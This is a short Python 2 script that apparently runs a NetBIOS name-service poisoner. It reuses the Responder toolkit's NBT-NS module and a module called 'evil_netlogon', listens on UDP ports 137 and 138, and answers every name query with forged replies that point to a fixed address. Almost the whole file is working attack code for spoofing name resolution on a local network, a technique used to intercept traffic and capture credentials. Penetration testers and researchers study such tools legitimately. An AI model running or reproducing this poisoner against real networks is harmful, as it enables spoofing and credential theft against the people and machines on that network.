
import sys
sys.path.append('./Responder')

import binascii
import socket
import poisoners.NBTNS
import packets
import settings
from twisted.internet.protocol import DatagramProtocol
from twisted.internet import protocol, reactor, endpoints

import evil_netlogon

settings.init()
settings.Config.AnalyzeMode = False
settings.Config.NBTNSDomain = True
settings.Config.Wredirect = False
settings.Config.IP_aton = socket.inet_aton('192.168.0.1')

def buildReply(data):
    if (poisoners.NBTNS.Validate_NBT_NS(data)):
        result = packets.NBT_Ans(Flags1="\xc4\x00")
        result.calculate(data)
        result = str(result)
    else:
        print "Did not verify and valid NBTNS request"
    return result

class NbnsUDP(DatagramProtocol):
    def datagramReceived(self, datagram, address):
        print "Received from address: " + str(address)
        self.transport.write(buildReply(datagram), address)
        print "Finished sending reply."

reactor.listenUDP(137, NbnsUDP())
reactor.listenUDP(138, evil_netlogon.NetLogonUDP())

print "Running..."
reactor.run()

